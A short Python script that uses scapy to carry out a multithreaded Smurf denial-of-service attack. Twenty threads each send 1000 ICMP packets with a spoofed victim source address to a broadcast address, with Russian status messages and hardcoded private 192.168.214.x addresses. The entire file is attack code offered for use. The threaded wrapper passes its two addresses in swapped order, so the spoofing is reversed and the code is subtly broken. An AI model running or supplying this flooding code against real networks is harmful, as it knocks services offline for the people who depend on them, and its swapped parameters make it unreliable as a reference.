import threading
import time
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

PACKETS_COUNTER = 1000
DELAY = 0.01
THREADS = 20


def smurf_attack(victim_ip, broadcast_ip):
    packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

    for i in range(PACKETS_COUNTER):
        send(packet, verbose=0)

        print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")

        time.sleep(DELAY)

    print(f"Отправлено {PACKETS_COUNTER} пакетов.")


def thread_smurf_attack(broadcast_ip, victim_ip):
    threads = []

    for i in range(THREADS):
        t = threading.Thread(target=smurf_attack, args=(broadcast_ip, victim_ip))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

broadcast_ip = "192.168.214.255"
victim_ip = "192.168.214.154"

thread_smurf_attack(broadcast_ip, victim_ip)
